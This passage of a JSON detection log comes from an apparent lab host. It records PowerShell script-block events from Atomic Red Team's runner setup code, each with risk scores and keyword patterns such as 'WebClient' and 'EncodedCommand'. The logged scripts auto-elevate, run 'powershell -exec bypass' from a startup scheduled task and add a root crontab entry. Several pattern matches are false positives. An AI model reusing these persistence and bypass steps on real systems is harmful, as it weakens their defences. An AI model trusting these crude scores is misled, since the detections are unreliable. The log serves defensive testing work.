[System.Diagnostics.Process]$Process,\n\n                [parameter(Mandatory = $true)]\n                [System.Text.StringBuilder]$StandardStringBuilder,\n\n                [parameter(Mandatory = $true)]\n                [System.Text.StringBuilder]$ErrorStringBuilder,\n\n                [parameter(Mandatory = $true)]\n                [Bool]$IsTimeout\n            )\n\n            return [PSCustomObject]@{\n                StandardOutput = $StandardStringBuilder.ToString().Trim()\n                ErrorOutput    = $ErrorStringBuilder.ToString().Trim()\n                ExitCode       = $Process.ExitCode\n                ProcessId      = $Process.Id\n                IsTimeOut      = $IsTimeout\n            }\n        }\n    }\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'EncodedCommand' matched: 'com/guitarrapc/PowerShellUtil/blob/master/Invoke'\nPattern 'WebClient' matched: 'http'\nPattern 'SuspiciousKeyword' matched: 'Start-Process'"
    },
    {
      "timestamp": "2024-12-16T20:34:56.1425664+00:00",
      "event_id": 35710921,
      "risk_score": 10,
      "detected_patterns": ", EncodedCommand, WebClient, SuspiciousKeyword",
      "pattern_details": "EncodedCommand [Score: 4]; WebClient [Score: 5]; SuspiciousKeyword [Score: 1]",
      "command_length": 7821,
      "full_command": "# The Invoke-Process function is loosely based on code from https://github.com/guitarrapc/PowerShellUtil/blob/master/Invoke-Process/Invoke-Process.ps1\nfunction Invoke-Process {\n    [OutputType([PSCustomObject])]\n    [CmdletBinding()]\n    param\n    (\n        [Parameter(Mandatory = $false, Position = 0)]\n        [string]$FileName = \"PowerShell.exe\",\n\n        [Parameter(Mandatory = $false, Position = 1)]\n        [string[]]$Arguments = \"\",\n\n        [Parameter(Mandatory = $false, Position = 3)]\n        [Int]$TimeoutSeconds = 120,\n\n        [Parameter(Mandatory = $false, Position = 4)]\n        [String]$stdoutFile = $null,\n\n        [Parameter(Mandatory = $false, Position = 5)]\n        [String]$stderrFile = $null\n    )\n\n    end {\n        $WorkingDirectory = if ($IsLinux -or $IsMacOS) { \"/tmp\" } else { $env:TEMP }\n        try {\n            # new Process\n            if ($stdoutFile) {\n                # new Process\n                $process = NewProcess -FileName $FileName -Arguments $Arguments -WorkingDirectory $WorkingDirectory\n\n                # Event Handler for Output\n                $stdSb = New-Object -TypeName System.Text.StringBuilder\n                $errorSb = New-Object -TypeName System.Text.StringBuilder\n                $scripBlock =\n                {\n                    $x = $Event.SourceEventArgs.Data\n                    if (-not [String]::IsNullOrEmpty($x)) {\n                        $Event.MessageData.AppendLine($x)\n                    }\n                }\n                $stdEvent = Register-ObjectEvent -InputObject $process -EventName OutputDataReceived -Action $scripBlock -MessageData $stdSb\n                $errorEvent = Register-ObjectEvent -InputObject $process -EventName ErrorDataReceived -Action $scripBlock -MessageData $errorSb\n\n                # execution\n                $process.Start() > $null\n                $process.BeginOutputReadLine()\n                $process.BeginErrorReadLine()\n                # wait for complete\n                $Timeout = [System.TimeSpan]::FromSeconds(($TimeoutSeconds))\n                $isTimeout = $false\n                if (-not $Process.WaitForExit($Timeout.TotalMilliseconds)) {\n                    $isTimeout = $true\n                    Invoke-KillProcessTree $process.id\n                    Write-Host -ForegroundColor Red \"Process Timed out after $TimeoutSeconds seconds, use '-TimeoutSeconds' to specify a different timeout\"\n                }\n                $process.CancelOutputRead()\n                $process.CancelErrorRead()\n\n                # Unregister Event to recieve Asynchronous Event output (should be called before process.Dispose())\n                Unregister-Event -SourceIdentifier $stdEvent.Name\n                Unregister-Event -SourceIdentifier $errorEvent.Name\n\n                $stdOutString = $stdSb.ToString().Trim()\n                if ($stdOutString.Length -gt 0) {\n                    Write-Host $stdOutString\n                }\n\n                $stdErrString = $errorSb.ToString().Trim()\n                if ($stdErrString.Length -gt 0) {\n                    Write-Host $stdErrString\n                }\n\n                # Get Process result\n                return GetCommandResult -Process $process -StandardStringBuilder $stdSb -ErrorStringBuilder $errorSb -IsTimeOut $isTimeout\n            }\n            else {\n                # This is the enitrety of the \"old style\" code, kept for interactive tests\n                $process = Start-Process -FilePath $FileName -ArgumentList $Arguments -WorkingDirectory $WorkingDirectory -NoNewWindow -PassThru\n                # cache process.Handle, otherwise ExitCode is null from powershell processes\n                $handle = $process.Handle\n\n                # wait for complete\n                $Timeout = [System.TimeSpan]::FromSeconds(($TimeoutSeconds))\n                if (-not $process.WaitForExit($Timeout.TotalMilliseconds)) {\n                    Invoke-KillProcessTree $process.id\n\n                    Write-Host -ForegroundColor Red \"Process Timed out after $TimeoutSeconds seconds, use '-TimeoutSeconds' to specify a different timeout\"\n                    if ($stdoutFile) {\n                        # Add a warning in stdoutFile in case of timeout\n                        # problem: $stdoutFile was locked in writing by the process we just killed, sometimes it's too fast and the lock isn't released immediately\n                        # solution: retry at most 10 times with 100ms between each attempt\n                        For ($i = 0; $i -lt 10; $i++) {\n                            try {\n                                \"<timeout>\" | Out-File (Join-Path $WorkingDirectory $stdoutFile) -Append -Encoding ASCII\n                                break # if we're here it means the file wasn't locked and Out-File worked, so we can leave the retry loop\n                            }\n                            catch {} # file is locked\n                            Start-Sleep -m 100\n                        }\n                    }\n                }\n\n                if ($IsLinux -or $IsMacOS) {\n                    Start-Sleep -Seconds 5 # On nix, the last 4 lines of stdout get overwritten upon return so pause for a bit to ensure user can view results\n                }\n\n                # Get Process result\n                return [PSCustomObject]@{\n                    StandardOutput = \"\"\n                    ErrorOutput    = \"\"\n                    ExitCode       = $process.ExitCode\n                    ProcessId      = $Process.Id\n                    IsTimeOut      = $IsTimeout\n                }\n\n            }\n\n        }\n        finally {\n            if ($null -ne $process) { $process.Dispose() }\n            if ($null -ne $stdEvent) { $stdEvent.StopJob(); $stdEvent.Dispose() }\n            if ($null -ne $errorEvent) { $errorEvent.StopJob(); $errorEvent.Dispose() }\n        }\n    }\n\n    begin {\n        function NewProcess {\n            [OutputType([System.Diagnostics.Process])]\n            [CmdletBinding()]\n            param\n            (\n                [parameter(Mandatory = $true)]\n                [string]$FileName,\n\n                [parameter(Mandatory = $false)]\n                [string[]]$Arguments,\n\n                [parameter(Mandatory = $false)]\n                [string]$WorkingDirectory\n            )\n\n            # ProcessStartInfo\n            $psi = New-object System.Diagnostics.ProcessStartInfo\n            $psi.CreateNoWindow = $true\n            $psi.UseShellExecute = $false\n            $psi.RedirectStandardOutput = $true\n            $psi.RedirectStandardError = $true\n            $psi.FileName = $FileName\n            $psi.Arguments += $Arguments\n            $psi.WorkingDirectory = $WorkingDirectory\n\n            # Set Process\n            $process = New-Object System.Diagnostics.Process\n            $process.StartInfo = $psi\n            $process.EnableRaisingEvents = $true\n            return $process\n        }\n\n        function GetCommandResult {\n            [OutputType([PSCustomObject])]\n            [CmdletBinding()]\n            param\n            (\n                [parameter(Mandatory = $true)]\n                [System.Diagnostics.Process]$Process,\n\n                [parameter(Mandatory = $true)]\n                [System.Text.StringBuilder]$StandardStringBuilder,\n\n                [parameter(Mandatory = $true)]\n                [System.Text.StringBuilder]$ErrorStringBuilder,\n\n                [parameter(Mandatory = $true)]\n                [Bool]$IsTimeout\n            )\n\n            return [PSCustomObject]@{\n                StandardOutput = $StandardStringBuilder.ToString().Trim()\n                ErrorOutput    = $ErrorStringBuilder.ToString().Trim()\n                ExitCode       = $Process.ExitCode\n                ProcessId      = $Process.Id\n                IsTimeOut      = $IsTimeout\n            }\n        }\n    }\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'EncodedCommand' matched: 'com/guitarrapc/PowerShellUtil/blob/master/Invoke'\nPattern 'WebClient' matched: 'http'\nPattern 'SuspiciousKeyword' matched: 'Start-Process'"
    },
    {
      "timestamp": "2024-12-16T20:34:54.4372229+00:00",
      "event_id": 35710567,
      "risk_score": 8,
      "detected_patterns": ", SuspiciousCmdlet, WebClient, Get, SuspiciousKeyword",
      "pattern_details": "SuspiciousCmdlet [Score: 1]; WebClient [Score: 5]; Get [Score: 1]; SuspiciousKeyword [Score: 1]",
      "command_length": 10264,
      "full_command": "function Invoke-SetupAtomicRunner {\n\n    [CmdletBinding(\n        SupportsShouldProcess = $true,\n        PositionalBinding = $false,\n        ConfirmImpact = 'Medium')]\n    Param(\n        [Parameter(Mandatory = $false)]\n        [switch]\n        $SkipServiceSetup,\n\n        [Parameter(Mandatory = $false)]\n        [switch]\n        $asScheduledtask\n    )\n\n    # ensure running with admin privs\n    if ($artConfig.OS -eq \"windows\") {\n        # auto-elevate on Windows\n        $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())\n        $testadmin = $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)\n        if ($testadmin -eq $false) {\n            Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -noexit -file \"{0}\" -elevated' -f ($myinvocation.MyCommand.Definition))\n            exit $LASTEXITCODE\n        }\n    }\n    else {\n        # linux and macos check - doesn't auto-elevate\n        if ((id -u) -ne 0 ) {\n            Throw \"You must run the Invoke-SetupAtomicRunner script as root\"\n            exit\n        }\n    }\n\n    if ($artConfig.basehostname.length -gt 15) { Throw \"The hostname for this machine (minus the GUID) must be 15 characters or less. Please rename this computer.\" }\n\n    #create AtomicRunner-Logs directories if they don't exist\n    New-Item -ItemType Directory $artConfig.atomicLogsPath -ErrorAction Ignore\n    New-Item -ItemType Directory $artConfig.runnerFolder -ErrorAction Ignore\n\n    if ($artConfig.OS -eq \"windows\") {\n        if ($asScheduledtask) {\n            if (Test-Path $artConfig.credFile) {\n                Write-Host \"Credential File $($artConfig.credFile) already exists, not prompting for creation of a new one.\"\n                $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $artConfig.user, (Get-Content $artConfig.credFile | ConvertTo-SecureString)\n            }\n            else {\n                # create credential file for the user since we aren't using a group managed service account\n                $cred = Get-Credential -UserName $artConfig.user -message \"Enter password for $($artConfig.user) in order to create the runner scheduled task\"\n                $cred.Password | ConvertFrom-SecureString | Out-File $artConfig.credFile\n            }\n            # setup scheduled task that will start the runner after each restart\n            # local security policy --> Local Policies --> Security Options --> Network access: Do not allow storage of passwords and credentials for network authentication must be disabled\n            $taskName = \"KickOff-AtomicRunner\"\n            Unregister-ScheduledTask $taskName -confirm:$false -ErrorAction Ignore\n            # Windows scheduled task includes a 20 minutes sleep then restart if the call to Invoke-KickoffAtomicRunner fails\n            # this occurs occassionally when Windows has issues logging into the runner user's account and logs in as a TEMP user\n            $taskAction = New-ScheduledTaskAction -Execute \"powershell.exe\" -Argument \"-exec bypass -Command Invoke-KickoffAtomicRunner; Start-Sleep 1200; Restart-Computer -Force\"\n            $taskPrincipal = New-ScheduledTaskPrincipal -UserId $artConfig.user\n            $delays = @(1, 2, 4, 8, 16, 32, 64) # using multiple triggers as a retry mechanism because the built-in retry mechanism doesn't work when the computer renaming causes AD replication delays\n            $triggers = @()\n            foreach ($delay in $delays) {\n                $trigger = New-ScheduledTaskTrigger -AtStartup\n                $trigger.Delay = \"PT$delay`M\"\n                $triggers += $trigger\n            }\n            $task = New-ScheduledTask -Action $taskAction -Principal $taskPrincipal -Trigger $triggers -Description \"A task that runs 1 minute or later after boot to start the atomic test runner script\"\n            try {\n                $null = Register-ScheduledTask -TaskName $taskName -InputObject $task -User $artConfig.user -Password $($cred.GetNetworkCredential().password) -ErrorAction Stop\n            }\n            catch {\n                if ($_.CategoryInfo.Category -eq \"AuthenticationError\") {\n                    # remove the credential file if the password didn't work\n                    Write-Error \"The credentials you entered are incorrect. Please run the setup script again and double check the username and password.\"\n                    Remove-Item $artConfig.credFile\n                }\n                else {\n                    Throw $_\n                }\n            }\n\n            # remove the atomicrunnerservice now that we are using a scheduled task instead\n            . \"$PSScriptRoot\\AtomicRunnerService.ps1\" -Remove\n        }\n        elseif (-not $SkipServiceSetup) {\n            # create the service that will start the runner after each restart\n            # The user must have the \"Log on as a service\" right. To add that right, open the Local Security Policy management console, go to the\n            # \"\\Security Settings\\Local Policies\\User Rights Assignments\" folder, and edit the \"Log on as a service\" policy there.\n            . \"$PSScriptRoot\\AtomicRunnerService.ps1\" -Remove\n            . \"$PSScriptRoot\\AtomicRunnerService.ps1\" -UserName $artConfig.user -installDir $artConfig.serviceInstallDir -Setup\n            Add-EnvPath -Container Machine -Path $artConfig.serviceInstallDir\n            # set service start retry options\n            $ServiceDisplayName = \"AtomicRunnerService\"\n            $action1, $action2, $action3 = \"restart\"\n            $time1 = 600000 # 10 minutes in miliseconds\n            $action2 = \"restart\"\n            $time2 = 600000 # 10 minutes in miliseconds\n            $actionLast = \"restart\"\n            $timeLast = 3600000 # 1 hour in miliseconds\n            $resetCounter = 86400 # 1 day in seconds\n            $services = Get-CimInstance -ClassName 'Win32_Service' | Where-Object { $_.DisplayName -imatch $ServiceDisplayName }\n            $action = $action1 + \"/\" + $time1 + \"/\" + $action2 + \"/\" + $time2 + \"/\" + $actionLast + \"/\" + $timeLast\n            foreach ($service in $services) {\n                # https://technet.microsoft.com/en-us/library/cc742019.aspx\n                $output = sc.exe  failure $($service.Name) actions= $action reset= $resetCounter\n            }\n            # set service to delayed auto-start (doesn't reflect in the services console until after a reboot)\n            Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\AtomicRunnerService\" -Name Start -Value 2\n            Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\AtomicRunnerService\" -Name DelayedAutostart -Value 1\n\n            # remove scheduled task now that we are using a service instead\n            Unregister-ScheduledTask \"KickOff-AtomicRunner\" -confirm:$false -ErrorAction Ignore\n        }\n    }\n    else {\n        # sets cronjob string using basepath from config.ps1\n        $pwshPath = which pwsh\n        $job = \"@reboot root sleep 60;$pwshPath -Command Invoke-KickoffAtomicRunner\"\n        $exists = cat /etc/crontab | Select-String -Quiet \"KickoffAtomicRunner\"\n        #checks if the Kickoff-AtomicRunner job exists. If not appends it to the system crontab.\n        if ($null -eq $exists) {\n            $(Write-Output \"$job\" >> /etc/crontab)\n            write-host \"setting cronjob\"\n        }\n        else {\n            write-host \"cronjob already exists\"\n        }\n    }\n\n    # Add Import-Module statement to the PowerShell profile\n    $root = Split-Path $PSScriptRoot -Parent\n    $pathToPSD1 = Join-Path $root \"Invoke-AtomicRedTeam.psd1\"\n    $importStatement = \"Import-Module \"\"$pathToPSD1\"\" -Force\"\n    $profileFolder = Split-Path $profile\n    New-Item -ItemType Directory -Force -Path $profileFolder | Out-Null\n    New-Item $PROFILE -ErrorAction Ignore\n    $profileContent = Get-Content $profile\n    $line = $profileContent | Select-String \".*import-module.*invoke-atomicredTeam.psd1\" | Select-Object -ExpandProperty Line\n    if ($line) {\n        $profileContent | ForEach-Object { $_.replace( $line, \"$importStatement\") } | Set-Content $profile\n    }\n    else {\n        Add-Content $profile $importStatement\n    }\n\n    # Install the Posh-SYLOG module if we are configured to use it and it is not already installed\n    if ((-not (Get-Module -ListAvailable \"Posh-SYSLOG\")) -and [bool]$artConfig.syslogServer -and [bool]$artConfig.syslogPort) {\n        write-verbose \"Posh-SYSLOG\"\n        Install-Module -Name Posh-SYSLOG -Scope CurrentUser -Force\n    }\n\n    # create the CSV schedule of atomics to run if it doesn't exist\n    if (-not (Test-Path $artConfig.scheduleFile)) {\n        Invoke-GenerateNewSchedule\n    }\n\n    $schedule = Get-Schedule\n    if ($null -eq $schedule) {\n        Write-Host -ForegroundColor Yellow \"There are no tests enabled on the schedule, set the 'Enabled' column to 'True' for the atomic test that you want to run. The schedule file is found here: $($artConfig.scheduleFile)\"\n        Write-Host -ForegroundColor Yellow \"Rerun this setup script after updating the schedule\"\n    }\n    else {\n        # Get the prereqs for all of the tests on the schedule\n        Invoke-AtomicRunner -GetPrereqs\n    }\n}\n\n# Add-EnvPath from https://gist.github.com/mkropat/c1226e0cc2ca941b23a9\nfunction Add-EnvPath {\n    param(\n        [Parameter(Mandatory = $true)]\n        [string] $Path,\n\n        [ValidateSet('Machine', 'User', 'Session')]\n        [string] $Container = 'Session'\n    )\n\n    if ($Container -ne 'Session') {\n        $containerMapping = @{\n            Machine = [EnvironmentVariableTarget]::Machine\n            User    = [EnvironmentVariableTarget]::User\n        }\n        $containerType = $containerMapping[$Container]\n\n        $persistedPaths = [Environment]::GetEnvironmentVariable('Path', $containerType) -split ';'\n        if ($persistedPaths -notcontains $Path) {\n            $persistedPaths = $persistedPaths + $Path | Where-Object { $_ }\n            [Environment]::SetEnvironmentVariable('Path', $persistedPaths -join ';', $containerType)\n        }\n    }\n\n    $envPaths = $env:Path -split ';'\n    if ($envPaths -notcontains $Path) {\n        $envPaths = $envPaths + $Path | Where-Object { $_ }\n        $env:Path = $envPaths -join ';'\n    }\n}",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'SuspiciousCmdlet' matched: 'Verb RunAs'\nPattern 'WebClient' matched: 'http'\nPattern 'WebClient' matched: 'http'\nPattern 'SuspiciousKeyword' matched: 'Start-Process'"
    },
    {
      "timestamp": "2024-12-16T20:34:56.1102033+00:00",
      "event_id": 35710897,
      "risk_score": 8,
      "detected_patterns": ", SuspiciousCmdlet, WebClient, Get, SuspiciousKeyword",
      "pattern_details": "SuspiciousCmdlet [Score: 1]; WebClient [Score: 5]; Get [Score: 1]; SuspiciousKeyword [Score: 1]",
      "command_length": 10264,
      "full_command": "function Invoke-SetupAtomicRunner {\n\n    [CmdletBinding(\n        SupportsShouldProcess = $true,\n        PositionalBinding = $false,\n        ConfirmImpact = 'Medium')]\n    Param(\n        [Parameter(Mandatory = $false)]\n        [switch]\n        $SkipServiceSetup,\n\n        [Parameter(Mandatory = $false)]\n        [switch]\n        $asScheduledtask\n    )\n\n    # ensure running with admin privs\n    if ($artConfig.OS -eq \"windows\") {\n        # auto-elevate on Windows\n        $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())\n        $testadmin = $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)\n        if ($testadmin -eq $false) {\n            Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -noexit -file \"{0}\" -elevated' -f ($myinvocation.MyCommand.Definition))\n            exit $LASTEXITCODE\n        }\n    }\n    else {\n        # linux and macos check - doesn't auto-elevate\n        if ((id -u) -ne 0 ) {\n            Throw \"You must run the Invoke-SetupAtomicRunner script as root\"\n            exit\n        }\n    }\n\n    if ($artConfig.basehostname.length -gt 15) { Throw \"The hostname for this machine (minus the GUID) must be 15 characters or less. Please rename this computer.\" }\n\n    #create AtomicRunner-Logs directories if they don't exist\n    New-Item -ItemType Directory $artConfig.atomicLogsPath -ErrorAction Ignore\n    New-Item -ItemType Directory $artConfig.runnerFolder -ErrorAction Ignore\n\n    if ($artConfig.OS -eq \"windows\") {\n        if ($asScheduledtask) {\n            if (Test-Path $artConfig.credFile) {\n                Write-Host \"Credential File $($artConfig.credFile) already exists, not prompting for creation of a new one.\"\n                $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $artConfig.user, (Get-Content $artConfig.credFile | ConvertTo-SecureString)\n            }\n            else {\n                # create credential file for the user since we aren't using a group managed service account\n                $cred = Get-Credential -UserName $artConfig.user -message \"Enter password for $($artConfig.user) in order to create the runner scheduled task\"\n                $cred.Password | ConvertFrom-SecureString | Out-File $artConfig.credFile\n            }\n            # setup scheduled task that will start the runner after each restart\n            # local security policy --> Local Policies --> Security Options --> Network access: Do not allow storage of passwords and credentials for network authentication must be disabled\n            $taskName = \"KickOff-AtomicRunner\"\n            Unregister-ScheduledTask $taskName -confirm:$false -ErrorAction Ignore\n            # Windows scheduled task includes a 20 minutes sleep then restart if the call to Invoke-KickoffAtomicRunner fails\n            # this occurs occassionally when Windows has issues logging into the runner user's account and logs in as a TEMP user\n            $taskAction = New-ScheduledTaskAction -Execute \"powershell.exe\" -Argument \"-exec bypass -Command Invoke-KickoffAtomicRunner; Start-Sleep 1200; Restart-Computer -Force\"\n            $taskPrincipal = New-ScheduledTaskPrincipal -UserId $artConfig.user\n            $delays = @(1, 2, 4, 8, 16, 32, 64) # using multiple triggers as a retry mechanism because the built-in retry mechanism doesn't work when the computer renaming causes AD replication delays\n            $triggers = @()\n            foreach ($delay in $delays) {\n                $trigger = New-ScheduledTaskTrigger -AtStartup\n                $trigger.Delay = \"PT$delay`M\"\n                $triggers += $trigger\n            }\n            $task = New-ScheduledTask -Action $taskAction -Principal $taskPrincipal -Trigger $triggers -Description \"A task that runs 1 minute or later after boot to start the atomic test runner script\"\n            try {\n                $null = Register-ScheduledTask -TaskName $taskName -InputObject $task -User $artConfig.user -Password $($cred.GetNetworkCredential().password) -ErrorAction Stop\n            }\n            catch {\n                if ($_.CategoryInfo.Category -eq \"AuthenticationError\") {\n                    # remove the credential file if the password didn't work\n                    Write-Error \"The credentials you entered are incorrect. Please run the setup script again and double check the username and password.\"\n                    Remove-Item $artConfig.credFile\n                }\n                else {\n                    Throw $_\n                }\n            }\n\n            # remove the atomicrunnerservice now that we are using a scheduled task instead\n            . \"$PSScriptRoot\\AtomicRunnerService.ps1\" -Remove\n        }\n        elseif (-not $SkipServiceSetup) {\n            # create the service that will start the runner after each restart\n            # The user must have the \"Log on as a service\" right. To add that right, open the Local Security Policy management console, go to the\n            # \"\\Security Settings\\Local Policies\\User Rights Assignments\" folder, and edit the \"Log on as a service\" policy there.\n            . \"$PSScriptRoot\\AtomicRunnerService.ps1\" -Remove\n            . \"$PSScriptRoot\\AtomicRunnerService.ps1\" -UserName $artConfig.user -installDir $artConfig.serviceInstallDir -Setup\n            Add-EnvPath -Container Machine -Path $artConfig.serviceInstallDir\n            # set service start retry options\n            $ServiceDisplayName = \"AtomicRunnerService\"\n            $action1, $action2, $action3 = \"restart\"\n            $time1 = 600000 # 10 minutes in miliseconds\n            $action2 = \"restart\"\n            $time2 = 600000 # 10 minutes in miliseconds\n            $actionLast = \"restart\"\n            $timeLast = 3600000 # 1 hour in miliseconds\n            $resetCounter = 86400 # 1 day in seconds\n            $services = Get-CimInstance -ClassName 'Win32_Service' | Where-Object { $_.DisplayName -imatch $ServiceDisplayName }\n            $action = $action1 + \"/\" + $time1 + \"/\" + $action2 + \"/\" + $time2 + \"/\" + $actionLast + \"/\" + $timeLast\n            foreach ($service in $services) {\n                # https://technet.microsoft.com/en-us/library/cc742019.aspx\n                $output = sc.exe  failure $($service.Name) actions= $action reset= $resetCounter\n            }\n            # set service to delayed auto-start (doesn't reflect in the services console until after a reboot)\n            Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\AtomicRunnerService\" -Name Start -Value 2\n            Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\AtomicRunnerService\" -Name DelayedAutostart -Value 1\n\n            # remove scheduled task now that we are using a service instead\n            Unregister-ScheduledTask \"KickOff-AtomicRunner\" -confirm:$false -ErrorAction Ignore\n        }\n    }\n    else {\n        # sets cronjob string using basepath from config.ps1\n        $pwshPath = which pwsh\n        $job = \"@reboot root sleep 60;$pwshPath -Command Invoke-KickoffAtomicRunner\"\n        $exists = cat /etc/crontab | Select-String -Quiet \"KickoffAtomicRunner\"\n        #checks if the Kickoff-AtomicRunner job exists. If not appends it to the system crontab.\n        if ($null -eq $exists) {\n            $(Write-Output \"$job\" >> /etc/crontab)\n            write-host \"setting cronjob\"\n        }\n        else {\n            write-host \"cronjob already exists\"\n        }\n    }\n\n    # Add Import-Module statement to the PowerShell profile\n    $root = Split-Path $PSScriptRoot -Parent\n    $pathToPSD1 = Join-Path $root \"Invoke-AtomicRedTeam.psd1\"\n    $importStatement = \"Import-Module \"\"$pathToPSD1\"\" -Force\"\n    $profileFolder = Split-Path $profile\n    New-Item -ItemType Directory -Force -Path $profileFolder | Out-Null\n    New-Item $PROFILE -ErrorAction Ignore\n    $profileContent = Get-Content $profile\n    $line = $profileContent | Select-String \".*import-module.*invoke-atomicredTeam.psd1\" | Select-Object -ExpandProperty Line\n    if ($line) {\n        $profileContent | ForEach-Object { $_.replace( $line, \"$importStatement\") } | Set-Content $profile\n    }\n    else {\n        Add-Content $profile $importStatement\n    }\n\n    # Install the Posh-SYLOG module if we are configured to use it and it is not already installed\n    if ((-not (Get-Module -ListAvailable \"Posh-SYSLOG\")) -and [bool]$artConfig.syslogServer -and [bool]$artConfig.syslogPort) {\n        write-verbose \"Posh-SYSLOG\"\n        Install-Module -Name Posh-SYSLOG -Scope CurrentUser -Force\n    }\n\n    # create the CSV schedule of atomics to run if it doesn't exist\n    if (-not (Test-Path $artConfig.scheduleFile)) {\n        Invoke-GenerateNewSchedule\n    }\n\n    $schedule = Get-Schedule\n    if ($null -eq $schedule) {\n        Write-Host -ForegroundColor Yellow \"There are no tests enabled on the schedule, set the 'Enabled' column to 'True' for the atomic test that you want to run. The schedule file is found here: $($artConfig.scheduleFile)\"\n        Write-Host -ForegroundColor Yellow \"Rerun this setup script after updating the schedule\"\n    }\n    else {\n        # Get the prereqs for all of the tests on the schedule\n        Invoke-AtomicRunner -GetPrereqs\n    }\n}\n\n# Add-EnvPath from https://gist.github.com/mkropat/c1226e0cc2ca941b23a9\nfunction Add-EnvPath {\n    param(\n        [Parameter(Mandatory = $true)]\n        [string] $Path,\n\n        [ValidateSet('Machine', 'User', 'Session')]\n        [string] $Container = 'Session'\n    )\n\n    if ($Container -ne 'Session') {\n        $containerMapping = @{\n            Machine = [EnvironmentVariableTarget]::Machine\n            User    = [EnvironmentVariableTarget]::User\n        }\n        $containerType = $containerMapping[$Container]\n\n        $persistedPaths = [Environment]::GetEnvironmentVariable('Path', $containerType) -split ';'\n        if ($persistedPaths -notcontains $Path) {\n            $persistedPaths = $persistedPaths + $Path | Where-Object { $_ }\n            [Environment]::SetEnvironmentVariable('Path', $persistedPaths -join ';', $containerType)\n        }\n    }\n\n    $envPaths = $env:Path -split ';'\n    if ($envPaths -notcontains $Path) {\n        $envPaths = $envPaths + $Path | Where-Object { $_ }\n        $env:Path = $envPaths -join ';'\n    }\n}",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'SuspiciousCmdlet' matched: 'Verb RunAs'\nPattern 'WebClient' matched: 'http'\nPattern 'WebClient' matched: 'http'\nPattern 'SuspiciousKeyword' matched: 'Start-Process'"
    },
    {
      "timestamp": "2024-12-16T20:34:55.2354539+00:00",
      "event_id": 35710706,
      "risk_score": 8,
      "detected_patterns": ", SuspiciousCmdlet, WebClient, Get, SuspiciousKeyword",
      "pattern_details": "SuspiciousCmdlet [Score: 1]; WebClient [Score: 5]; Get [Score: 1]; SuspiciousKeyword [Score: 1]",
      "command_length": 10264,
      "full_command": "function Invoke-SetupAtomicRunner {\n\n    [CmdletBinding(\n        SupportsShouldProcess = $true,\n        PositionalBinding = $false,\n        ConfirmImpact = 'Medium')]\n    Param(\n        [Parameter(Mandatory = $false)]\n        [switch]\n        $SkipServiceSetup,\n\n        [Parameter(Mandatory = $false)]\n        [switch]\n        $asScheduledtask\n    )\n\n    # ensure running with admin privs\n    if ($artConfig.OS -eq \"windows\") {\n        # auto-elevate on Windows\n        $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())\n        $testadmin = $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)\n        if ($testadmin -eq $false) {\n            Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -noexit -file \"{0}\" -elevated' -f ($myinvocation.MyCommand.Definition))\n            exit $LASTEXITCODE\n        }\n    }\n    else {\n        # linux and macos check - doesn't auto-elevate\n        if ((id -u) -ne 0 ) {\n            Throw \"You must run the Invoke-SetupAtomicRunner script as root\"\n            exit\n        }\n    }\n\n    if ($artConfig.basehostname.length -gt 15) { Throw \"The hostname for this machine (minus the GUID) must be 15 characters or less. Please rename this computer.\" }\n\n    #create AtomicRunner-Logs directories if they don't exist\n    New-Item -ItemType Directory $artConfig.atomicLogsPath -ErrorAction Ignore\n    New-Item -ItemType Directory $artConfig.runnerFolder -ErrorAction Ignore\n\n    if ($artConfig.OS -eq \"windows\") {\n        if ($asScheduledtask) {\n            if (Test-Path $artConfig.credFile) {\n                Write-Host \"Credential File $($artConfig.credFile) already exists, not prompting for creation of a new one.\"\n                $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $artConfig.user, (Get-Content $artConfig.credFile | ConvertTo-SecureString)\n            }\n            else {\n                # create credential file for the user since we aren't using a group managed service account\n                $cred = Get-Credential -UserName $artConfig.user -message \"Enter password for $($artConfig.user) in order to create the runner scheduled task\"\n                $cred.Password | ConvertFrom-SecureString | Out-File $artConfig.credFile\n            }\n            # setup scheduled task that will start the runner after each restart\n            # local security policy --> Local Policies --> Security Options --> Network access: Do not allow storage of passwords and credentials for network authentication must be disabled\n            $taskName = \"KickOff-AtomicRunner\"\n            Unregister-ScheduledTask $taskName -confirm:$false -ErrorAction Ignore\n            # Windows scheduled task includes a 20 minutes sleep then restart if the call to Invoke-KickoffAtomicRunner fails\n            # this occurs occassionally when Windows has issues logging into the runner user's account and logs in as a TEMP user\n            $taskAction = New-ScheduledTaskAction -Execute \"powershell.exe\" -Argument \"-exec bypass -Command Invoke-KickoffAtomicRunner; Start-Sleep 1200; Restart-Computer -Force\"\n            $taskPrincipal = New-ScheduledTaskPrincipal -UserId $artConfig.user\n            $delays = @(1, 2, 4, 8, 16, 32, 64) # using multiple triggers as a retry mechanism because the built-in retry mechanism doesn't work when the 